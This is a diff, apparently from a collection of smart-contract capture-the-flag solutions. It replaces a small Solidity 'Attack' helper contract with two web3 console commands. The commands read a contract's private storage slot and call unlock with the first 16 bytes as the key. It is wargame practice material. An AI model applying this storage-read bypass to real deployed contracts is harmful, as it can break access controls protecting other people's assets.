@@ -1,10 +1,2 @@
-//SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
-
-//web3.eth.getStorageAt("0x7D185ef96fC0AbD17C9AEDbB85245EeC96C577e9",5)
-contract Attack{
-  function turn(bytes32 _In) public pure returns (bytes16 _out){
-    _out = bytes16(_In);
-    return _out;
-  }
-}
+1. await web3.eth.getStorageAt("instance address", "0x05")
+2. await contract.unlock("0x3c62634d8d610ce0d72f0041af1c5591") // first 16 bytes of the return from 1.
